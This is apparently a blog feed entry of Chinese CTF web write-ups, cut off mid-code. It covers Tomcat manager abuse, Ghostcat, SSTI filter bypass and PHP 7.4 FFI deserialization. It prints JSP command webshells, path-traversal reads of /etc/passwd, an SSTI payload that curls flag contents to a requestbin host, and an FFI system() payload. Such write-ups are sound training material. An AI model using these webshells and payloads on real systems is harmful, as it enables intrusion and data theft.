    <link href="http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-04-01T14:00:37.000Z</published>
    <updated>2020-04-21T14:58:02.736Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</h3><ul><li><p>考点</p><p>php数组特性</p></li><li><p>解题步骤</p></li></ul><ol><li>题目存在源代码泄露，下载UploadFile.class.php.bak,发现使用的是PHP免扩展加密根据这篇文章介绍<a href="https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：" target="_blank" rel="noopener">https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) &#123;</span><br><span class="line">        return $this-&gt;error(&#39;只允许上传图片文件&#39;);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span><br><span class="line">$origin_name &#x3D; current($filename);   &#x2F;&#x2F;返回数组中的当前单元</span><br><span class="line">$ext &#x3D; end($filename);  &#x2F;&#x2F;将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</span><br><span class="line">$new_name &#x3D; ($this-&gt;new_name ? $this-&gt;new_name : $origin_name) . &#39;.&#39; . $ext;</span><br><span class="line">$target_fullpath &#x3D; $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure><p>判断后缀名是否在白名单中使用了<code>$filename[count($filename) - 1]</code>，而最后字符合成文件名的时候使用了<code>end($filename)</code>。两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。可以通过数组绕过：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200401221558883.png" alt></p><p>在跟目录得到flag</p><h3 id="0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="0x 02 [WUSTCTF2020]Train Yourself To Be Godly"></a>0x 02 [WUSTCTF2020]Train Yourself To Be Godly</h3><ul><li><p>考点</p><p>tomcat解析漏洞</p></li><li><p>解题过程</p></li></ul><p>补充知识：apache中的tomcat/webapps目录如下</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/GnhzdO.png" alt></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传</p><p>URL路径参数不规范引发的问题:</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/Gn4FSA.png" alt></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><p>文章告诉我们可以通过 /..;/manager/html 进入到manager页面</p><ol><li>随便加一串路径，根据报错信息得知当前的tomcat的root路径为examlpes</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204510802.png" alt></p><ol start="2"><li>访问<code>/..;/manager/html</code>目录穿越到 manager 需要输入密码验证，这里是弱密码 tomcat/tomcat</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204629584.png" alt></p><p>接下来是后台getshell过程，webshell构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>用<code>jar cvf lxj.war webshell.jsp</code>命令将webshell.jsp打包成war,然后上传文件，发现回显404，根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试。接着会发现401，未授权访问。是缺少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。<br> <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>后面就是tomcat:tomcat的base64编码。继续上传，发现403。一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问/..;/manager/html出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205226924.png" alt></p><p>最后访问webshell，得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205311373.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves</a></p><p><a href="https://www.jianshu.com/p/368d6c41a2f6" target="_blank" rel="noopener">https://www.jianshu.com/p/368d6c41a2f6</a></p></blockquote><h3 id="0x-03-WUSTCTF2020-easyweb"><a href="#0x-03-WUSTCTF2020-easyweb" class="headerlink" title="0x 03 [WUSTCTF2020]easyweb"></a>0x 03 [WUSTCTF2020]easyweb</h3><ul><li><p>考点</p><p>CVE-2020-1938幽灵猫文件包含</p></li><li><p>解题过程</p></li></ul><ol><li>题目打开是一个文件上传，传一个文件上传上去会返回一个之前上传的文件下载，经过测试发现此处存在任意文件读取，可以随意下载：</li></ol><p>尝试WEB-INF下的web.xml:<code>/download?file=../web.xml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;webAppRootKey&lt;&#x2F;param-name&gt;</span><br><span class="line">        &lt;param-value&gt;tomcat.ajp&lt;&#x2F;param-value&gt;</span><br><span class="line">    &lt;&#x2F;context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;</span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        &lt;&#x2F;listener-class&gt;</span><br><span class="line">    &lt;&#x2F;listener&gt;</span><br><span class="line"></span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;views&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;</span><br><span class="line">    &lt;&#x2F;welcome-file-list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;error-page&gt;</span><br><span class="line">        &lt;exception-type&gt;java.lang.Throwable&lt;&#x2F;exception-type&gt;</span><br><span class="line">        &lt;location&gt;&#x2F;error&lt;&#x2F;location&gt;</span><br><span class="line">    &lt;&#x2F;error-page&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure><p>尝试读取/etc/passwd:<code>/download?file=../../../../../../../etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:101:101::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:102:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>使用CVE-2020-1938exp（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面</a></p><blockquote><p>注意由于靶机在内网，所以IP地址是根据Lan Domain确定的，外网IP是内网穿透绑定的</p></blockquote><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221242014.png" alt></p><p>构造exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传成功后利用文件包含执行木马，最后<code>cat /flag78bt787it8b9b098j0k80k0ggg</code>得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221421718.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2176.html#easyweb</a></p><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves</a></p></blockquote><h3 id="0x-04-GWCTF-2019-你的名字"><a href="#0x-04-GWCTF-2019-你的名字" class="headerlink" title="0x 04 [GWCTF 2019]你的名字"></a>0x 04 [GWCTF 2019]你的名字</h3><ul><li><p>考点</p><p>ssti bypass</p></li><li><p>解题过程</p></li></ul><p>经过fuzz,后台强过滤匹配<code></code>，这里可以用if语句绕过。黑名单过滤如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist &#x3D; [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,</span><br><span class="line">                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,</span><br><span class="line">                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]</span><br><span class="line">for no in blacklist:</span><br><span class="line">    while True:</span><br><span class="line">        if no in s:</span><br><span class="line">            s &#x3D; s.replace(no, &#39;&#39;)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">return s</span><br></pre></td></tr></table></figure><p>这个逻辑是按顺序针对每个关键词过滤，只能应付双写绕过，可以用列表的最后一项来绕过过滤,payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl http:&#x2F;&#x2F;http.requconfigestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure><p>过滤之后最终的脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-05-RCTF-2019-Nextphp"><a href="#0x-05-RCTF-2019-Nextphp" class="headerlink" title="0x 05 [RCTF 2019]Nextphp"></a>0x 05 [RCTF 2019]Nextphp</h3><ul><li><p>考点</p><p>php7.4新版本特性</p></li><li><p>解题过程</p></li></ul><ol><li>查看php配置信息，版本是7.4，同时发现过滤了大多数系统函数</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224651185.png" alt></p><ol start="2"><li>没有过滤scandir函数，payload:<code>?a=var_dump(scandir(&#39;/var/www/html&#39;));</code></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224810734.png" alt></p><ol start="3"><li>利用file_get_contents()查看preload.php源码，payload：<code>a=echo file_get_contents(&#39;preload.php&#39;);</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码是：PHP7.4新特性：新的自定义对象序列化机制：<a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></p><ol start="4"><li>观察代码，发现对象反序列化时会执行run()方法</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时发现可以结合__get魔法函数，获取对象data数组中的元素值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>根据题目文件名称提示关注php7.4的新特性，关于<code>opcache.preload</code>，参考这篇文章<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> 可知</li></ol><blockquote><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。</p></blockquote><p>在这篇文档尾巴可以看到如下描述：</p><blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI  functionality only in preloaded PHP files, but not in regular ones</p></blockquote><p>大概意思就是说允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展，但是文档中说了 <strong>FFI</strong> 是一个危险的拓展，而这道题目却开启了 <strong>FFI</strong> 拓展。</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;$a%3dunserialize(&#39;C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D&#39;)-&gt;ret;var_dump($a-&gt;system(&quot;cat%20&#x2F;flag&gt;b.txt&quot;));</span><br></pre></td></tr></table></figure><p>最后访问b.txt得到flag</p><p>参考资料：</p><blockquote><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p><p><a href="https://blog.csdn.net/qq_41809896/article/details/90384668" target="_blank" rel="noopener">https://blog.csdn.net/qq_41809896/article/details/90384668</a></p><p><a href="https://cjm00n.top/CTF/buuoj-writeup-2.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/buuoj-writeup-2.html</a></p></blockquote><h3 id="0x-06-SCTF2019-Flag-Shop"><a href="#0x-06-SCTF2019-Flag-Shop" class="headerlink" title="0x 06 [SCTF2019]Flag Shop"></a>0x 06 [SCTF2019]Flag Shop</h3><ul><li><p>考点</p><p>erb模版注入</p></li><li><p>解题过程</p></li></ul><ol><li><p>页面打开是一个购买flag的页面，flag需要1e+27个JinKela才能购买，数量不够。访问robots.txt发现filebak目录，访问得到页面源代码</p></li><li><p>审计代码发现</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get &quot;&#x2F;work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;</span><br><span class="line">  auth &#x3D; auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)</span><br><span class="line">      puts 